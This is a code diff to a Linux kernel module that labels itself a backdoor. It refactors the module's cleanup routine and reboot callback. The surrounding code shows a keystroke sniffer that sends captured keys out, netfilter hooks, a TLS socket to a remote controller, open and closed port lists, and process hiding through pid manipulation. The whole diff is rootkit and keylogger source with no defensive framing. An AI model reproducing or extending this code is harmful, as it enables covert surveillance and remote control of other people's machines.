@@ -8,6 +8,7 @@
 #include <linux/circ_buf.h>
 #include <linux/init.h>
 #include <linux/ip.h>
+#include <linux/kallsyms.h>
 #include <linux/kernel.h>
 #include <linux/keyboard.h>
 #include <linux/kthread.h>
@@ -572,13 +573,56 @@ void consume_keys(struct work_struct* work) {
     printk(KERN_INFO "Sent keystroke %s\n", keystroke);
 }
 
+void my_custom_cleanup(void) {
+    int i;
+    nf_unregister_net_hook(&init_net, &nfho);
+    nf_unregister_net_hook(&init_net, &nfhi);
+
+    unregister_keyboard_notifier(&keysniffer_blk);
+    unregister_reboot_notifier(&reboot_blk);
+
+    if (svc) {
+        if (svc->tls_socket) {
+            sock_release(svc->tls_socket);
+            printk(KERN_INFO "release tls_socket\n");
+        }
+        kfree(svc);
+    }
+
+    if (buffer) {
+        kfree(buffer);
+    }
+    if (open_ports) {
+        kfree(open_ports);
+    }
+    if (closed_ports) {
+        kfree(closed_ports);
+    }
+
+    write_lock(my_tasklist_lock);
+    for (i = 0; i < hidden_count; ++i) {
+        change_pidR(hidden_procs[i].ts, PIDTYPE_PID, hidden_procs[i].p);
+        //Decrement the refcount to reset pid struct
+        put_pid(hidden_procs[i].p);
+        force_sig(SIGKILL, hidden_procs[i].ts);
+    }
+    write_unlock(my_tasklist_lock);
+}
+
 //Kills the kernel module indirectly on reboot
 int reboot_cb(struct notifier_block* nblock, unsigned long code, void* _param) {
-    show();
+    printk(KERN_ALERT "Entered reboot callback\n");
+    if (code == SYS_RESTART) {
+        printk(KERN_ALERT "Hit restart block\n");
+        show();
 
-    const char* foobar = "foobar";
-    send_msg(svc->tls_socket, foobar, strlen(foobar));
-    return 0;
+        //my_custom_cleanup();
+
+        const char* foobar = "foobar";
+        send_msg(svc->tls_socket, foobar, strlen(foobar));
+    }
+    printk(KERN_ALERT "Exiting reboot callback\n");
+    return NOTIFY_DONE;
 }
 
 /*
@@ -660,40 +704,7 @@ static int __init mod_init(void) {
  * Module exit function
  */
 static void __exit mod_exit(void) {
-    int i;
-    nf_unregister_net_hook(&init_net, &nfho);
-    nf_unregister_net_hook(&init_net, &nfhi);
-
-    unregister_keyboard_notifier(&keysniffer_blk);
-    unregister_reboot_notifier(&reboot_blk);
-
-    if (svc) {
-        if (svc->tls_socket) {
-            sock_release(svc->tls_socket);
-            printk(KERN_INFO "release tls_socket\n");
-        }
-        kfree(svc);
-    }
-
-    if (buffer) {
-        kfree(buffer);
-    }
-    if (open_ports) {
-        kfree(open_ports);
-    }
-    if (closed_ports) {
-        kfree(closed_ports);
-    }
-
-    write_lock(my_tasklist_lock);
-    for (i = 0; i < hidden_count; ++i) {
-        change_pidR(hidden_procs[i].ts, PIDTYPE_PID, hidden_procs[i].p);
-        //Decrement the refcount to reset pid struct
-        put_pid(hidden_procs[i].p);
-        force_sig(SIGKILL, hidden_procs[i].ts);
-    }
-    write_unlock(my_tasklist_lock);
-
+    my_custom_cleanup();
     printk(KERN_ALERT "removed backdoor module\n");
 }
 
